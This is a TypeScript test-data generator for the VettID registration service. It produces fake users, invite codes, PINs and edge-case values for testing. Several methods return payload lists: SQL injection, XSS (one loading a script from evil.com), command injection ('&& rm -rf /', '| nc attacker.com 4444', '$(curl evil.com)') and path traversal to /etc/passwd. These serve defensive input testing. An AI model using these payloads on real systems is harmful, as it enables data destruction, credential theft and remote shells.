/**
 * Test data generator for VettID testing sprint
 * Generates realistic and malicious test data
 */
export class TestDataGenerator {
  private counter = 0;

  /**
   * Generate unique test email
   */
  generateEmail(prefix: string = 'test'): string {
    const timestamp = Date.now();
    const random = Math.random().toString(36).substring(7);
    this.counter++;
    return `${prefix}-${timestamp}-${this.counter}-${random}@test.vettid.dev`;
  }

  /**
   * Generate invite code in VettID format
   */
  generateInviteCode(): string {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let code = 'VET-';
    for (let i = 0; i < 12; i++) {
      code += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return code;
  }

  /**
   * Generate complete user object
   */
  generateUser(overrides?: Partial<UserData>): UserData {
    return {
      first_name: overrides?.first_name || this.generateFirstName(),
      last_name: overrides?.last_name || this.generateLastName(),
      email: overrides?.email || this.generateEmail(),
      invite_code: overrides?.invite_code || process.env.TEST_INVITE_CODE || 'VET-TEST123456'
    };
  }

  /**
   * Generate first name
   */
  generateFirstName(): string {
    const names = ['John', 'Jane', 'Michael', 'Sarah', 'David', 'Emily', 'Robert', 'Lisa'];
    return names[Math.floor(Math.random() * names.length)];
  }

  /**
   * Generate last name
   */
  generateLastName(): string {
    const names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis'];
    return names[Math.floor(Math.random() * names.length)];
  }

  /**
   * Generate PIN (4-6 digits)
   */
  generatePin(length: number = 6): string {
    let pin = '';
    for (let i = 0; i < length; i++) {
      pin += Math.floor(Math.random() * 10);
    }
    return pin;
  }

  /**
   * Generate malicious SQL injection payloads
   */
  generateSQLInjection(): string[] {
    return [
      "'; DROP TABLE registrations; --",
      "' OR '1'='1",
      "1' OR '1' = '1' --",
      "admin'--",
      "' UNION SELECT * FROM users--",
      "1'; DELETE FROM registrations WHERE '1'='1",
      "'; EXEC sp_MSForEachTable 'DROP TABLE ?'; --"
    ];
  }

  /**
   * Generate XSS (Cross-Site Scripting) payloads
   */
  generateXSSPayloads(): string[] {
    return [
      "<script>alert('xss')</script>",
      "<img src=x onerror=alert('xss')>",
      "<svg onload=alert('xss')>",
      "javascript:alert('xss')",
      "<iframe src='javascript:alert(\"xss\")'></iframe>",
      "<body onload=alert('xss')>",
      "<<SCRIPT>alert('xss');//<</SCRIPT>",
      "<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>"
    ];
  }

  /**
   * Generate command injection payloads
   */
  generateCommandInjection(): string[] {
    return [
      "; cat /etc/passwd",
      "| ls -la",
      "&& rm -rf /",
      "`whoami`",
      "$(curl evil.com)",
      "; ping -c 10 127.0.0.1",
      "| nc attacker.com 4444"
    ];
  }

  /**
   * Generate path traversal payloads
   */
  generatePathTraversal(): string[] {
    return [
      "../../../etc/passwd",
      "..\\..\\..\\windows\\system32",
      "....//....//....//etc/passwd",
      "..%2F..%2F..%2Fetc%2Fpasswd",
      "..%252F..%252F..%252Fetc%252Fpasswd"
    ];
  }

  /**
   * Generate invalid email formats
   */
  generateInvalidEmails(): string[] {
    return [
      'invalid',
      'test@',
      '@domain.com',
      'test@@domain.com',
      'test@domain',
      'test space@domain.com',
      'test@domain@com',
      'test.domain.com',
      '',
      'a'.repeat(256) + '@domain.com' // Too long
    ];
  }

  /**
   * Generate special character names (valid international names)
   */
  generateInternationalNames(): Array<{ first_name: string; last_name: string }> {
    return [
      { first_name: "O'Brien", last_name: "McCarthy" },
      { first_name: "José", last_name: "García" },
      { first_name: "François", last_name: "Müller" },
      { first_name: "李", last_name: "明" },
      { first_name: "مُحَمَّد", last_name: "أحمد" },
      { first_name: "Søren", last_name: "Jørgensen" },
      { first_name: "Piotr", last_name: "Nowak" },
      { first_name: "Владимир", last_name: "Петров" }
    ];
  }

  /**
   * Generate edge case field values
   */
  generateEdgeCases(): EdgeCaseValues {
    return {
      // Empty values
      empty: '',
      null: null as any,
      undefined: undefined as any,

      // Minimum lengths
      oneChar: 'A',
      twoChars: 'AB',

      // Maximum lengths
      max255: 'A'.repeat(255),
      max1000: 'A'.repeat(1000),

      // Special characters
      specialChars: "!@#$%^&*()_+-=[]{}|;':\",./<>?",
      unicode: "😀🎉🔥💯✨",
      whitespace: '   ',
      newlines: 'Line1\nLine2\nLine3',
      tabs: 'Tab1\tTab2\tTab3',

      // Numbers
      zero: 0,
      negative: -1,
      maxInt: Number.MAX_SAFE_INTEGER,
      minInt: Number.MIN_SAFE_INTEGER,

      // Booleans
      boolTrue: true,
      boolFalse: false
    };
  }

  /**
   * Generate boundary PIN values
   */
  generatePINBoundaries(): Array<{ pin: string; valid: boolean; description: string }> {
    return [
      { pin: '123', valid: false, description: 'Too short (3 digits)' },
      { pin: '1234', valid: true, description: 'Minimum valid (4 digits)' },
      { pin: '12345', valid: true, description: 'Mid-range (5 digits)' },
      { pin: '123456', valid: true, description: 'Maximum valid (6 digits)' },
      { pin: '1234567', valid: false, description: 'Too long (7 digits)' },
      { pin: 'abcd', valid: false, description: 'Non-numeric' },
      { pin: '12 34', valid: false, description: 'Contains space' },
      { pin: '', valid: false, description: 'Empty string' }
    ];
  }

  /**
   * Generate batch of users for bulk testing
   */
  generateBatchUsers(count: number, prefix: string = 'batch'): UserData[] {
    const users: UserData[] = [];
    for (let i = 0; i < count; i++) {
      users.push(this.generateUser({
        email: this.generateEmail(`${prefix}${i}`)
      }));
    }
    return users;
  }

  /**
   * Generate test invite with options
   */
  generateInviteOptions(overrides?: Partial<InviteOptions>): InviteOptions {
    const futureDate = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000); // 30 days

    return {
      code: overrides?.code || this.generateInviteCode(),
      max_uses: overrides?.max_uses ?? 10,
      expires_at: overrides?.expires_at || futureDate.toISOString(),
      auto_approve: overrides?.auto_approve ?? false
    };
  }

  /**
   * Generate expired invite options
   */
  generateExpiredInvite(): InviteOptions {
    const pastDate = new Date(Date.now() - 24 * 60 * 60 * 1000); // Yesterday

    return {
      code: this.generateInviteCode(),
      max_uses: 10,
      expires_at: pastDate.toISOString(),
      auto_approve: false
    };
  }

  /**
   * Generate exhausted invite options
   */
  generateExhaustedInvite(): InviteOptions {
    return {
      code: this.generateInviteCode(),
      max_uses: 0, // Already exhausted
      expires_at: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toISOString(),
      auto_approve: false
    };
  }

  /**
   * Generate membership terms text
   */
  generateMembershipTerms(): string {
    return `
# VettID Membership Terms (Test Version)

## 1. Membership Agreement
By accepting these terms, you agree to abide by all VettID policies and procedures.

## 2. Member Responsibilities
- Maintain account security
- Use services in accordance with terms
- Respect other members

## 3. Termination
Membership may be terminated at any time with 7 days notice.

Generated at: ${new Date().toISOString()}
Test Version: ${Math.random().toString(36).substring(7)}
    `.trim();
  }

  /**
   * Reset counter
   */
  resetCounter(): void {
    this.counter = 0;
  }
}

// Type definitions

export interface UserData {
  first_name: string;
  last_name: string;
  email: string;
  invite_code: string;
}

export interface InviteOptions {
  code?: string;
  max_uses?: number;
  expires_at?: string;
  auto_approve?: boolean;
}

export interface EdgeCaseValues {
  empty: string;
  null: any;
  undefined: any;
  oneChar: string;
  twoChars: string;
  max255: string;
  max1000: string;
  specialChars: string;
  unicode: string;
  whitespace: string;
  newlines: string;
  tabs: string;
  zero: number;
  negative: number;
  maxInt: number;
  minInt: number;
  boolTrue: boolean;
  boolFalse: boolean;
}

// Export singleton instance
export const testDataGenerator = new TestDataGenerator();
